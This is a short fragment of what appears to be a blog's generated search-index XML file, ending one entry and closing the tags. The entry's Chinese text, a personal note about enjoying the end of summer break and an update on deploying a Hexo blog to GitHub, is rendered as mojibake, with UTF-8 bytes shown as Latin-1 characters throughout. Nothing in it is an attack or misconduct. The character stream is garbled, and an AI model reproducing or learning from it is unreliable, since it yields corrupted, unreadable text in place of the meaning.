·å§ã€‚è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šæ²¡ææ‡‚ï¼Œä½†æœ€é¦–å…ˆçš„å…ˆäº«å—ä¸€ä¸‹æˆ‘æœ€åçš„åæ¥å¤©æš‘å‡å§!</p><p>æ›´æ–°ï¼š11/19 ä½¿ç”¨hexoå¹¶éƒ¨ç½²åˆ°äº†githubä¸Šï¼Œæ‰“ç®—ä½¿ç”¨è‡ªå·±çš„äº‘æœåŠ¡å™¨åšåŠ é€Ÿ= =</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
